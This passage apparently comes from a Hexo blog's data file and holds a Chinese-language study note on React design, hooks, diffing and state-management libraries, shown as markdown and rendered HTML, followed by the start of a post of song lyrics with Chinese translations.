times</p>\n            <button onClick={()=>setCount(count+1)}>Click +1</button>\n        </div>\n    )\n}\n```\n\n### Hook使用法则\n\n- 不要在循环、条件或嵌套中调用hook\n\n## 四、React实现\n\n### 1.Problems\n\n- JSX不符合JS语法标准；\n\n![](https://s3.bmp.ovh/imgs/2023/01/30/1fc630e94d6d6c60.jpg)\n\n- 返回的JSX发生改变时，如何更新DOM；\n\n> 计算新旧JSX的Difference\n\n- 指令式：说一步做一步\n- 声明式\n- 响应式\n\n![](https://s3.bmp.ovh/imgs/2023/01/30/9ff90ed31b0de3e3.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/01/30/cf361645d5820a2d.jpg)\n\n```\nstate改变->计算diff->更新dom\n\nHow to diff?\n\n更新次数少<----tradeoff---->计算速度快\n完美的最小Diff算法，需要O(n^3)\n换取时间，需要O（n）\n```\n\n|       元素       | 更新方法 |\n| :--------------: | :------: |\n|   不同类型元素   |   替换   |\n| 同类型的DOM元素  |   更新   |\n| 同类型的组件元素 |   递归   |\n\n弊病：最顶层的父组件状态发生改变，子组件全部更新\n\n- state/props改变时，如何重新触发render函数；\n\n## 五、React状态管理库\n\n### 1.核心思想\n\n> ***将状态抽离到UI外部进行统一管理\n>\n> 只存放需要共享的、距离较远的\n\n### 2.常用管理库推荐\n\n- redux\n- xstate\n- mobx\n- recoil\n\n### 3.状态机\n\n> 当前状态，收到外部事件，迁移到下一个状态\n\n### 4.ModernJS/Reduck\n\n## 六、应用级框架科普\n\n- NextJS  (研究一下Vercel)\n- ModernJS (Web Infra)全栈开发框架\n- Blitz 无API思想的全栈开发框架，开发过程无需写API调用与CRUD逻辑 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/React.md","raw":"---\ntitle: React\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - React\n    - 笔记\nmp3: \ncover: img/bg4.jpeg\n---\n\n\n# React\n\n## 一、应用\n\n- 前端应用\n- 移动原生\n- 桌面应用Electron  React 3D\n\n## 二、原型\n\n1. Facebook在其php生态中引入了组合式组件的思想，启发了后来的react设计\n2. J.W创建了FaxJS,也就是React的原型；\n3. Facebook收购ins后，该项目在内使用，基于FaxJS创建了React；\n\n## 三、React设计思路\n\n### 1.UI编程痛点\n\n- 状态更新，UI不会自动更新，需要手动调用DOM\n- 欠缺基本的代码层面的封装和隔离，代码层面没有组件化\n- UI之间的数据依赖关系需要手动维护，如果 依赖链条过长，会遇到“Callbace Hell”\n\n### 2.响应式与转换式\n\n- 转换式：给定输入求解输出；  （编译器、数值计算）\n- 响应式：监听事件没消息驱动； （监控系统、UI界面）\n\n```\n事件->执行既定的回调->状态更新->UI更新\n```\n\n### 3.响应式编程\n\n- 状态更新，UI自动更新\n- 前端代码组件化、可复用、可封装\n- 状态之间的互相依赖关系、只需要声明计科\n\n### 4.组件化\n\n- 组件是组件的组合/原子组件\n- 组件内部拥有状态，外部不可见\n- 父组件可将状态传入组件内部\n\n### 5.状态归属问题\n\n```\nNote：共享变量需要提升到最近的祖先组件、可以用状态管理解决；\nE.g:如果状态归属于两个节点，就向上寻找到最近的祖宗节点；\n```\n\n![](https://s3.bmp.ovh/imgs/2023/01/30/edd9edf1a3d14f27.jpg)\n\n> Javascript中、函数是【一等公民】\n>\n> **通过向子组件传递function来改变根组件的变量（形成双向数据流）\n\n### 6.思考\n\n- React是单向数据流、还是双向数据流？\n\n> 其实是单向数据流，永远是父组件给子组件传递，并不代表子组件不能改变父组件数据；\n\n- 如何解决状态不合理上升的问题？（第五节解决）\n\n> 状态管理库\n\n- 组件的状态改变之后，如何更新DOM？（第四节解决）\n\n> 1\n\n### 7.组件设计\n\n- 组件声明了状态和UI的映射；\n- 组件拥有Props/State两种状态；\n- 组件可由其他组件拼装而成；\n\n解法：\n\n- 组件内部拥有私有状态State\n- 组件接受外部的Props状态提供复用性\n- 根据当前的state/props返回一个UI\n\n```react\nfunction Component(props){\n    const {url}=props;\n    this.text='click me';\n    \n    return(\n    \t<div>\n        \t<SubComponent props={{color:'red'}}></SubComponent>\n            <img src={url}></img>\n            <button>clike me</button>\n        </div>\n    )\n}\n```\n\n### 8.生命周期\n\n![](https://s3.bmp.ovh/imgs/2023/01/30/4fc6e86cf176a88b.jpg)\n\n### 9.React Hooks \n\n```react\nimport React,{useState} from 'react';\n\nfunction Example(){\n    //声明一个新状态需要手动调用useState，返回一个状态和set该状态的函数；\n    const [count,setState]=useState(0);\n    \n    //传入一个函数和一个数组秘书组是状态的数组，称作依赖项，该函数在mount时执行\n    //有“副作用”的函数，要传入useEffect来执行。副作用代表出来单纯的计算之外还要做其他事情。比如网络请求，更新DOM，localStorage存储数据等；\n    useEffect(()=>{\n        document.title=`You clicked ${count} times`;\n    })\n    \n    return(\n    \t<div>\n        \t<p>Clicked { count } times</p>\n            <button onClick={()=>setCount(count+1)}>Click +1</button>\n        </div>\n    )\n}\n```\n\n### Hook使用法则\n\n- 不要在循环、条件或嵌套中调用hook\n\n## 四、React实现\n\n### 1.Problems\n\n- JSX不符合JS语法标准；\n\n![](https://s3.bmp.ovh/imgs/2023/01/30/1fc630e94d6d6c60.jpg)\n\n- 返回的JSX发生改变时，如何更新DOM；\n\n> 计算新旧JSX的Difference\n\n- 指令式：说一步做一步\n- 声明式\n- 响应式\n\n![](https://s3.bmp.ovh/imgs/2023/01/30/9ff90ed31b0de3e3.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/01/30/cf361645d5820a2d.jpg)\n\n```\nstate改变->计算diff->更新dom\n\nHow to diff?\n\n更新次数少<----tradeoff---->计算速度快\n完美的最小Diff算法，需要O(n^3)\n换取时间，需要O（n）\n```\n\n|       元素       | 更新方法 |\n| :--------------: | :------: |\n|   不同类型元素   |   替换   |\n| 同类型的DOM元素  |   更新   |\n| 同类型的组件元素 |   递归   |\n\n弊病：最顶层的父组件状态发生改变，子组件全部更新\n\n- state/props改变时，如何重新触发render函数；\n\n## 五、React状态管理库\n\n### 1.核心思想\n\n> ***将状态抽离到UI外部进行统一管理\n>\n> 只存放需要共享的、距离较远的\n\n### 2.常用管理库推荐\n\n- redux\n- xstate\n- mobx\n- recoil\n\n### 3.状态机\n\n> 当前状态，收到外部事件，迁移到下一个状态\n\n### 4.ModernJS/Reduck\n\n## 六、应用级框架科普\n\n- NextJS  (研究一下Vercel)\n- ModernJS (Web Infra)全栈开发框架\n- Blitz 无API思想的全栈开发框架，开发过程无需写API调用与CRUD逻辑 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"React","published":1,"updated":"2023-03-27T11:03:25.639Z","_id":"clg29vygd001mao9cc9nm1o4d","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"React\"><a href=\"#React\" class=\"headerlink\" title=\"React\"></a>React</h1><h2 id=\"一、应用\"><a href=\"#一、应用\" class=\"headerlink\" title=\"一、应用\"></a>一、应用</h2><ul>\n<li>前端应用</li>\n<li>移动原生</li>\n<li>桌面应用Electron  React 3D</li>\n</ul>\n<h2 id=\"二、原型\"><a href=\"#二、原型\" class=\"headerlink\" title=\"二、原型\"></a>二、原型</h2><ol>\n<li>Facebook在其php生态中引入了组合式组件的思想，启发了后来的react设计</li>\n<li>J.W创建了FaxJS,也就是React的原型；</li>\n<li>Facebook收购ins后，该项目在内使用，基于FaxJS创建了React；</li>\n</ol>\n<h2 id=\"三、React设计思路\"><a href=\"#三、React设计思路\" class=\"headerlink\" title=\"三、React设计思路\"></a>三、React设计思路</h2><h3 id=\"1-UI编程痛点\"><a href=\"#1-UI编程痛点\" class=\"headerlink\" title=\"1.UI编程痛点\"></a>1.UI编程痛点</h3><ul>\n<li>状态更新，UI不会自动更新，需要手动调用DOM</li>\n<li>欠缺基本的代码层面的封装和隔离，代码层面没有组件化</li>\n<li>UI之间的数据依赖关系需要手动维护，如果 依赖链条过长，会遇到“Callbace Hell”</li>\n</ul>\n<h3 id=\"2-响应式与转换式\"><a href=\"#2-响应式与转换式\" class=\"headerlink\" title=\"2.响应式与转换式\"></a>2.响应式与转换式</h3><ul>\n<li>转换式：给定输入求解输出；  （编译器、数值计算）</li>\n<li>响应式：监听事件没消息驱动； （监控系统、UI界面）</li>\n</ul>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs clean\">事件-&gt;执行既定的回调-&gt;状态更新-&gt;UI更新<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-响应式编程\"><a href=\"#3-响应式编程\" class=\"headerlink\" title=\"3.响应式编程\"></a>3.响应式编程</h3><ul>\n<li>状态更新，UI自动更新</li>\n<li>前端代码组件化、可复用、可封装</li>\n<li>状态之间的互相依赖关系、只需要声明计科</li>\n</ul>\n<h3 id=\"4-组件化\"><a href=\"#4-组件化\" class=\"headerlink\" title=\"4.组件化\"></a>4.组件化</h3><ul>\n<li>组件是组件的组合/原子组件</li>\n<li>组件内部拥有状态，外部不可见</li>\n<li>父组件可将状态传入组件内部</li>\n</ul>\n<h3 id=\"5-状态归属问题\"><a href=\"#5-状态归属问题\" class=\"headerlink\" title=\"5.状态归属问题\"></a>5.状态归属问题</h3><figure class=\"highlight avrasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs avrasm\">Note：共享变量需要提升到最近的祖先组件、可以用状态管理解决；<br><span class=\"hljs-symbol\">E.g:</span>如果状态归属于两个节点，就向上寻找到最近的祖宗节点；<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/01/30/edd9edf1a3d14f27.jpg\"></p>\n<blockquote>\n<p>Javascript中、函数是【一等公民】</p>\n<p>**通过向子组件传递function来改变根组件的变量（形成双向数据流）</p>\n</blockquote>\n<h3 id=\"6-思考\"><a href=\"#6-思考\" class=\"headerlink\" title=\"6.思考\"></a>6.思考</h3><ul>\n<li>React是单向数据流、还是双向数据流？</li>\n</ul>\n<blockquote>\n<p>其实是单向数据流，永远是父组件给子组件传递，并不代表子组件不能改变父组件数据；</p>\n</blockquote>\n<ul>\n<li>如何解决状态不合理上升的问题？（第五节解决）</li>\n</ul>\n<blockquote>\n<p>状态管理库</p>\n</blockquote>\n<ul>\n<li>组件的状态改变之后，如何更新DOM？（第四节解决）</li>\n</ul>\n<blockquote>\n<p>1</p>\n</blockquote>\n<h3 id=\"7-组件设计\"><a href=\"#7-组件设计\" class=\"headerlink\" title=\"7.组件设计\"></a>7.组件设计</h3><ul>\n<li>组件声明了状态和UI的映射；</li>\n<li>组件拥有Props/State两种状态；</li>\n<li>组件可由其他组件拼装而成；</li>\n</ul>\n<p>解法：</p>\n<ul>\n<li>组件内部拥有私有状态State</li>\n<li>组件接受外部的Props状态提供复用性</li>\n<li>根据当前的state/props返回一个UI</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs react\">function Component(props)&#123;<br>    const &#123;url&#125;=props;<br>    this.text=&#x27;click me&#x27;;<br>    <br>    return(<br>    \t&lt;div&gt;<br>        \t&lt;SubComponent props=&#123;&#123;color:&#x27;red&#x27;&#125;&#125;&gt;&lt;/SubComponent&gt;<br>            &lt;img src=&#123;url&#125;&gt;&lt;/img&gt;<br>            &lt;button&gt;clike me&lt;/button&gt;<br>        &lt;/div&gt;<br>    )<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"8-生命周期\"><a href=\"#8-生命周期\" class=\"headerlink\" title=\"8.生命周期\"></a>8.生命周期</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/01/30/4fc6e86cf176a88b.jpg\"></p>\n<h3 id=\"9-React-Hooks\"><a href=\"#9-React-Hooks\" class=\"headerlink\" title=\"9.React Hooks\"></a>9.React Hooks</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs react\">import React,&#123;useState&#125; from &#x27;react&#x27;;<br><br>function Example()&#123;<br>    //声明一个新状态需要手动调用useState，返回一个状态和set该状态的函数；<br>    const [count,setState]=useState(0);<br>    <br>    //传入一个函数和一个数组秘书组是状态的数组，称作依赖项，该函数在mount时执行<br>    //有“副作用”的函数，要传入useEffect来执行。副作用代表出来单纯的计算之外还要做其他事情。比如网络请求，更新DOM，localStorage存储数据等；<br>    useEffect(()=&gt;&#123;<br>        document.title=`You clicked $&#123;count&#125; times`;<br>    &#125;)<br>    <br>    return(<br>    \t&lt;div&gt;<br>        \t&lt;p&gt;Clicked &#123; count &#125; times&lt;/p&gt;<br>            &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt;Click +1&lt;/button&gt;<br>        &lt;/div&gt;<br>    )<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Hook使用法则\"><a href=\"#Hook使用法则\" class=\"headerlink\" title=\"Hook使用法则\"></a>Hook使用法则</h3><ul>\n<li>不要在循环、条件或嵌套中调用hook</li>\n</ul>\n<h2 id=\"四、React实现\"><a href=\"#四、React实现\" class=\"headerlink\" title=\"四、React实现\"></a>四、React实现</h2><h3 id=\"1-Problems\"><a href=\"#1-Problems\" class=\"headerlink\" title=\"1.Problems\"></a>1.Problems</h3><ul>\n<li>JSX不符合JS语法标准；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/01/30/1fc630e94d6d6c60.jpg\"></p>\n<ul>\n<li>返回的JSX发生改变时，如何更新DOM；</li>\n</ul>\n<blockquote>\n<p>计算新旧JSX的Difference</p>\n</blockquote>\n<ul>\n<li>指令式：说一步做一步</li>\n<li>声明式</li>\n<li>响应式</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/01/30/9ff90ed31b0de3e3.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/01/30/cf361645d5820a2d.jpg\"></p>\n<figure class=\"highlight pf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pf\"><span class=\"hljs-keyword\">state</span>改变-&gt;计算diff-&gt;更新dom<br><br>How <span class=\"hljs-keyword\">to</span> diff?<br><br>更新次数少<span class=\"hljs-variable\">&lt;----tradeoff----&gt;</span>计算速度快<br>完美的最小Diff算法，需要O(n^<span class=\"hljs-number\">3</span>)<br>换取时间，需要O（n）<br></code></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">元素</th>\n<th align=\"center\">更新方法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">不同类型元素</td>\n<td align=\"center\">替换</td>\n</tr>\n<tr>\n<td align=\"center\">同类型的DOM元素</td>\n<td align=\"center\">更新</td>\n</tr>\n<tr>\n<td align=\"center\">同类型的组件元素</td>\n<td align=\"center\">递归</td>\n</tr>\n</tbody></table>\n<p>弊病：最顶层的父组件状态发生改变，子组件全部更新</p>\n<ul>\n<li>state/props改变时，如何重新触发render函数；</li>\n</ul>\n<h2 id=\"五、React状态管理库\"><a href=\"#五、React状态管理库\" class=\"headerlink\" title=\"五、React状态管理库\"></a>五、React状态管理库</h2><h3 id=\"1-核心思想\"><a href=\"#1-核心思想\" class=\"headerlink\" title=\"1.核心思想\"></a>1.核心思想</h3><blockquote>\n<p>***将状态抽离到UI外部进行统一管理</p>\n<p>只存放需要共享的、距离较远的</p>\n</blockquote>\n<h3 id=\"2-常用管理库推荐\"><a href=\"#2-常用管理库推荐\" class=\"headerlink\" title=\"2.常用管理库推荐\"></a>2.常用管理库推荐</h3><ul>\n<li>redux</li>\n<li>xstate</li>\n<li>mobx</li>\n<li>recoil</li>\n</ul>\n<h3 id=\"3-状态机\"><a href=\"#3-状态机\" class=\"headerlink\" title=\"3.状态机\"></a>3.状态机</h3><blockquote>\n<p>当前状态，收到外部事件，迁移到下一个状态</p>\n</blockquote>\n<h3 id=\"4-ModernJS-Reduck\"><a href=\"#4-ModernJS-Reduck\" class=\"headerlink\" title=\"4.ModernJS/Reduck\"></a>4.ModernJS/Reduck</h3><h2 id=\"六、应用级框架科普\"><a href=\"#六、应用级框架科普\" class=\"headerlink\" title=\"六、应用级框架科普\"></a>六、应用级框架科普</h2><ul>\n<li>NextJS  (研究一下Vercel)</li>\n<li>ModernJS (Web Infra)全栈开发框架</li>\n<li>Blitz 无API思想的全栈开发框架，开发过程无需写API调用与CRUD逻辑 </li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"React\"><a href=\"#React\" class=\"headerlink\" title=\"React\"></a>React</h1><h2 id=\"一、应用\"><a href=\"#一、应用\" class=\"headerlink\" title=\"一、应用\"></a>一、应用</h2><ul>\n<li>前端应用</li>\n<li>移动原生</li>\n<li>桌面应用Electron  React 3D</li>\n</ul>\n<h2 id=\"二、原型\"><a href=\"#二、原型\" class=\"headerlink\" title=\"二、原型\"></a>二、原型</h2><ol>\n<li>Facebook在其php生态中引入了组合式组件的思想，启发了后来的react设计</li>\n<li>J.W创建了FaxJS,也就是React的原型；</li>\n<li>Facebook收购ins后，该项目在内使用，基于FaxJS创建了React；</li>\n</ol>\n<h2 id=\"三、React设计思路\"><a href=\"#三、React设计思路\" class=\"headerlink\" title=\"三、React设计思路\"></a>三、React设计思路</h2><h3 id=\"1-UI编程痛点\"><a href=\"#1-UI编程痛点\" class=\"headerlink\" title=\"1.UI编程痛点\"></a>1.UI编程痛点</h3><ul>\n<li>状态更新，UI不会自动更新，需要手动调用DOM</li>\n<li>欠缺基本的代码层面的封装和隔离，代码层面没有组件化</li>\n<li>UI之间的数据依赖关系需要手动维护，如果 依赖链条过长，会遇到“Callbace Hell”</li>\n</ul>\n<h3 id=\"2-响应式与转换式\"><a href=\"#2-响应式与转换式\" class=\"headerlink\" title=\"2.响应式与转换式\"></a>2.响应式与转换式</h3><ul>\n<li>转换式：给定输入求解输出；  （编译器、数值计算）</li>\n<li>响应式：监听事件没消息驱动； （监控系统、UI界面）</li>\n</ul>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs clean\">事件-&gt;执行既定的回调-&gt;状态更新-&gt;UI更新<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-响应式编程\"><a href=\"#3-响应式编程\" class=\"headerlink\" title=\"3.响应式编程\"></a>3.响应式编程</h3><ul>\n<li>状态更新，UI自动更新</li>\n<li>前端代码组件化、可复用、可封装</li>\n<li>状态之间的互相依赖关系、只需要声明计科</li>\n</ul>\n<h3 id=\"4-组件化\"><a href=\"#4-组件化\" class=\"headerlink\" title=\"4.组件化\"></a>4.组件化</h3><ul>\n<li>组件是组件的组合/原子组件</li>\n<li>组件内部拥有状态，外部不可见</li>\n<li>父组件可将状态传入组件内部</li>\n</ul>\n<h3 id=\"5-状态归属问题\"><a href=\"#5-状态归属问题\" class=\"headerlink\" title=\"5.状态归属问题\"></a>5.状态归属问题</h3><figure class=\"highlight avrasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs avrasm\">Note：共享变量需要提升到最近的祖先组件、可以用状态管理解决；<br><span class=\"hljs-symbol\">E.g:</span>如果状态归属于两个节点，就向上寻找到最近的祖宗节点；<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/01/30/edd9edf1a3d14f27.jpg\"></p>\n<blockquote>\n<p>Javascript中、函数是【一等公民】</p>\n<p>**通过向子组件传递function来改变根组件的变量（形成双向数据流）</p>\n</blockquote>\n<h3 id=\"6-思考\"><a href=\"#6-思考\" class=\"headerlink\" title=\"6.思考\"></a>6.思考</h3><ul>\n<li>React是单向数据流、还是双向数据流？</li>\n</ul>\n<blockquote>\n<p>其实是单向数据流，永远是父组件给子组件传递，并不代表子组件不能改变父组件数据；</p>\n</blockquote>\n<ul>\n<li>如何解决状态不合理上升的问题？（第五节解决）</li>\n</ul>\n<blockquote>\n<p>状态管理库</p>\n</blockquote>\n<ul>\n<li>组件的状态改变之后，如何更新DOM？（第四节解决）</li>\n</ul>\n<blockquote>\n<p>1</p>\n</blockquote>\n<h3 id=\"7-组件设计\"><a href=\"#7-组件设计\" class=\"headerlink\" title=\"7.组件设计\"></a>7.组件设计</h3><ul>\n<li>组件声明了状态和UI的映射；</li>\n<li>组件拥有Props/State两种状态；</li>\n<li>组件可由其他组件拼装而成；</li>\n</ul>\n<p>解法：</p>\n<ul>\n<li>组件内部拥有私有状态State</li>\n<li>组件接受外部的Props状态提供复用性</li>\n<li>根据当前的state/props返回一个UI</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs react\">function Component(props)&#123;<br>    const &#123;url&#125;=props;<br>    this.text=&#x27;click me&#x27;;<br>    <br>    return(<br>    \t&lt;div&gt;<br>        \t&lt;SubComponent props=&#123;&#123;color:&#x27;red&#x27;&#125;&#125;&gt;&lt;/SubComponent&gt;<br>            &lt;img src=&#123;url&#125;&gt;&lt;/img&gt;<br>            &lt;button&gt;clike me&lt;/button&gt;<br>        &lt;/div&gt;<br>    )<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"8-生命周期\"><a href=\"#8-生命周期\" class=\"headerlink\" title=\"8.生命周期\"></a>8.生命周期</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/01/30/4fc6e86cf176a88b.jpg\"></p>\n<h3 id=\"9-React-Hooks\"><a href=\"#9-React-Hooks\" class=\"headerlink\" title=\"9.React Hooks\"></a>9.React Hooks</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs react\">import React,&#123;useState&#125; from &#x27;react&#x27;;<br><br>function Example()&#123;<br>    //声明一个新状态需要手动调用useState，返回一个状态和set该状态的函数；<br>    const [count,setState]=useState(0);<br>    <br>    //传入一个函数和一个数组秘书组是状态的数组，称作依赖项，该函数在mount时执行<br>    //有“副作用”的函数，要传入useEffect来执行。副作用代表出来单纯的计算之外还要做其他事情。比如网络请求，更新DOM，localStorage存储数据等；<br>    useEffect(()=&gt;&#123;<br>        document.title=`You clicked $&#123;count&#125; times`;<br>    &#125;)<br>    <br>    return(<br>    \t&lt;div&gt;<br>        \t&lt;p&gt;Clicked &#123; count &#125; times&lt;/p&gt;<br>            &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt;Click +1&lt;/button&gt;<br>        &lt;/div&gt;<br>    )<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Hook使用法则\"><a href=\"#Hook使用法则\" class=\"headerlink\" title=\"Hook使用法则\"></a>Hook使用法则</h3><ul>\n<li>不要在循环、条件或嵌套中调用hook</li>\n</ul>\n<h2 id=\"四、React实现\"><a href=\"#四、React实现\" class=\"headerlink\" title=\"四、React实现\"></a>四、React实现</h2><h3 id=\"1-Problems\"><a href=\"#1-Problems\" class=\"headerlink\" title=\"1.Problems\"></a>1.Problems</h3><ul>\n<li>JSX不符合JS语法标准；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/01/30/1fc630e94d6d6c60.jpg\"></p>\n<ul>\n<li>返回的JSX发生改变时，如何更新DOM；</li>\n</ul>\n<blockquote>\n<p>计算新旧JSX的Difference</p>\n</blockquote>\n<ul>\n<li>指令式：说一步做一步</li>\n<li>声明式</li>\n<li>响应式</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/01/30/9ff90ed31b0de3e3.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/01/30/cf361645d5820a2d.jpg\"></p>\n<figure class=\"highlight pf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pf\"><span class=\"hljs-keyword\">state</span>改变-&gt;计算diff-&gt;更新dom<br><br>How <span class=\"hljs-keyword\">to</span> diff?<br><br>更新次数少<span class=\"hljs-variable\">&lt;----tradeoff----&gt;</span>计算速度快<br>完美的最小Diff算法，需要O(n^<span class=\"hljs-number\">3</span>)<br>换取时间，需要O（n）<br></code></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">元素</th>\n<th align=\"center\">更新方法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">不同类型元素</td>\n<td align=\"center\">替换</td>\n</tr>\n<tr>\n<td align=\"center\">同类型的DOM元素</td>\n<td align=\"center\">更新</td>\n</tr>\n<tr>\n<td align=\"center\">同类型的组件元素</td>\n<td align=\"center\">递归</td>\n</tr>\n</tbody></table>\n<p>弊病：最顶层的父组件状态发生改变，子组件全部更新</p>\n<ul>\n<li>state/props改变时，如何重新触发render函数；</li>\n</ul>\n<h2 id=\"五、React状态管理库\"><a href=\"#五、React状态管理库\" class=\"headerlink\" title=\"五、React状态管理库\"></a>五、React状态管理库</h2><h3 id=\"1-核心思想\"><a href=\"#1-核心思想\" class=\"headerlink\" title=\"1.核心思想\"></a>1.核心思想</h3><blockquote>\n<p>***将状态抽离到UI外部进行统一管理</p>\n<p>只存放需要共享的、距离较远的</p>\n</blockquote>\n<h3 id=\"2-常用管理库推荐\"><a href=\"#2-常用管理库推荐\" class=\"headerlink\" title=\"2.常用管理库推荐\"></a>2.常用管理库推荐</h3><ul>\n<li>redux</li>\n<li>xstate</li>\n<li>mobx</li>\n<li>recoil</li>\n</ul>\n<h3 id=\"3-状态机\"><a href=\"#3-状态机\" class=\"headerlink\" title=\"3.状态机\"></a>3.状态机</h3><blockquote>\n<p>当前状态，收到外部事件，迁移到下一个状态</p>\n</blockquote>\n<h3 id=\"4-ModernJS-Reduck\"><a href=\"#4-ModernJS-Reduck\" class=\"headerlink\" title=\"4.ModernJS/Reduck\"></a>4.ModernJS/Reduck</h3><h2 id=\"六、应用级框架科普\"><a href=\"#六、应用级框架科普\" class=\"headerlink\" title=\"六、应用级框架科普\"></a>六、应用级框架科普</h2><ul>\n<li>NextJS  (研究一下Vercel)</li>\n<li>ModernJS (Web Infra)全栈开发框架</li>\n<li>Blitz 无API思想的全栈开发框架，开发过程无需写API调用与CRUD逻辑 </li>\n</ul>\n"},{"title":"Sound of Walking Away","date":"2021-08-22T16:00:46.000Z","mp3":null,"cover":"img/bg14.jpg","_content":"\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/69628653da7948ea86c48e2ff0248662.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\nDon't come find me, I won't be here waiting\n请别试图寻找我 我不会再原地等待\nI so can do it alone, you're not worth staying\n我自己可以过得很好 你不值得我再多停留\n\nWeren't listening but now there's no way you won't hear\n你不曾倾听 但现在你不得不听\nThere's a voice emerging in the night so loud and clear\n有个声音在耳畔萦绕 嘹亮清晰\nI'll turn it up like you turn me down, I'm not afraid\n即使你想让我低声细语我也要大声宣泄，我不会畏惧\nHit play, hit play\n叫嚣着 呼喊着\nIt's the sound of walking 